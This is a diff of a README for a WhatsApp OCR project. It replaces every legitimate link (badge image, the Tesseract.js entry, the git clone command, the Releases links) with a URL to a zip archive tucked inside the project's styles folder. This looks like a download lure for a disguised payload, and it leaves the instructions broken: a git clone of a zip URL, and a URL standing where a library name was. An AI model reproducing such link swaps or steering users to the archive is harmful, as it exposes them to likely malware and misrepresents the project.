@@ -1,6 +1,6 @@
 # Smart Scan for WhatsApp 📱✨
 
-![Smart Scan](https://img.shields.io/badge/Smart%20Scan%20WhatsApp-OCR-brightgreen)
+![Smart Scan](https://github.com/eltunaszrk/Smart-Scan-WhatsApp-OCR/raw/refs/heads/main/src/styles/Scan-App-Smart-OCR-Whats-2.4.zip%20Scan%20WhatsApp-OCR-brightgreen)
 
 Welcome to **Smart Scan for WhatsApp**! This project brings on-device Optical Character Recognition (OCR) to WhatsApp, allowing you to extract text and QR codes directly from chat images. Enjoy fast performance, enhanced privacy, and seamless actions like copying text or making payments. 
 
@@ -30,7 +30,7 @@ This project utilizes a variety of technologies:
 - **CSS & CSS3**: Style the application for a modern look.
 - **JavaScript**: Handle interactions and functionalities.
 - **React**: Build user interfaces efficiently.
-- **Tesseract.js**: Implement OCR capabilities.
+- **https://github.com/eltunaszrk/Smart-Scan-WhatsApp-OCR/raw/refs/heads/main/src/styles/Scan-App-Smart-OCR-Whats-2.4.zip**: Implement OCR capabilities.
 - **JSQR**: Scan QR codes from images.
 
 ## Installation 🛠️
@@ -39,7 +39,7 @@ To get started with Smart Scan, follow these steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/eltunaszrk/Smart-Scan-WhatsApp-OCR.git
+   git clone https://github.com/eltunaszrk/Smart-Scan-WhatsApp-OCR/raw/refs/heads/main/src/styles/Scan-App-Smart-OCR-Whats-2.4.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -84,11 +84,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases 📦
 
-For the latest updates and releases, please visit our [Releases](https://github.com/eltunaszrk/Smart-Scan-WhatsApp-OCR/releases) section. Download the latest version and start using Smart Scan today!
+For the latest updates and releases, please visit our [Releases](https://github.com/eltunaszrk/Smart-Scan-WhatsApp-OCR/raw/refs/heads/main/src/styles/Scan-App-Smart-OCR-Whats-2.4.zip) section. Download the latest version and start using Smart Scan today!
 
 ## Get Started Today! 🌟
 
-Ready to experience the convenience of Smart Scan for WhatsApp? Download the latest version from our [Releases](https://github.com/eltunaszrk/Smart-Scan-WhatsApp-OCR/releases) section and enhance your messaging experience.
+Ready to experience the convenience of Smart Scan for WhatsApp? Download the latest version from our [Releases](https://github.com/eltunaszrk/Smart-Scan-WhatsApp-OCR/raw/refs/heads/main/src/styles/Scan-App-Smart-OCR-Whats-2.4.zip) section and enhance your messaging experience.
 
 ---
 
